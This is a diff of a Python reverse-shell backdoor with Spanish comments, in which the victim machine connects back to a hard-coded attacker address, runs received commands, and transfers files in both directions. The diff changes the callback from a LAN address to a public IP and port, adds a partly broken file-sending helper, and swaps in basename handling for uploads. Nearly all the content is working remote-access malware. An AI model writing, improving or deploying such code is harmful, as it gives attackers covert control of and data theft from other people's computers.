@@ -3,10 +3,10 @@ import socket
 import subprocess
 import json
 import os
-import re
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.BUFFER_SIZE = 4096
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante
 
@@ -17,7 +17,7 @@ class Backdoor:
         else:
             jsonData = json.dumps(data)
 
-        self.connection.send(bytes(jsonData, 'utf-8'))
+        self.connection.sendall(bytes(jsonData, 'utf-8'))
 
     #Decodificación json:
     def reliableRecieve(self):
@@ -52,6 +52,16 @@ class Backdoor:
             return '[-]El sistema no puede encontrar la ruta especificada'
     
     
+    def sendFileSize(self, file):
+        filesize = os.path.getsize(file)
+        self.connection.send(f'{file}|{filesize}'.encode())
+        with open(file, 'rb') as f:
+            while True:
+                bytesRead = f.read(self.BUFFER_SIZE)
+                if not bytesRead:
+                    break
+
+    
     def writeFile(self, path, route, content):
         try:
             contentToWrite = base64.b64decode(content)
@@ -71,6 +81,7 @@ class Backdoor:
             return base64.b64encode(b'[-]Archivo no encontrado')
     
     def run(self):
+        print(self.reliableRecieve())
         try:
             while True: #Permite al programa ejecutarse indefinidamente
                 command = self.reliableRecieve() #Recibe toda la información que le enviemos
@@ -85,8 +96,8 @@ class Backdoor:
                     commandResults = self.readFile(' '.join(command[2:]))
 
                 elif command[0] == 'up':
-                    path = re.sub('/.*/.*?/', '', ' '.join(command[3:]))
-                    self.writeFile(path, command[2], command[1])
+                    file = os.path.basename(' '.join(command[3:]))
+                    self.writeFile(file, command[2], command[1])
                     commandResults = b'[+]Archivo subido'
 
                 else: 
@@ -98,7 +109,6 @@ class Backdoor:
             self.reliableSend(b'El cliente ha finalizado la conexion')
             self.connection.close()
             print('\nConexión finalizada')
-
-
-backdoor = Backdoor('192.168.1.14', 4444)
+            
+backdoor = Backdoor('157.100.199.115', 65432)
 backdoor.run()
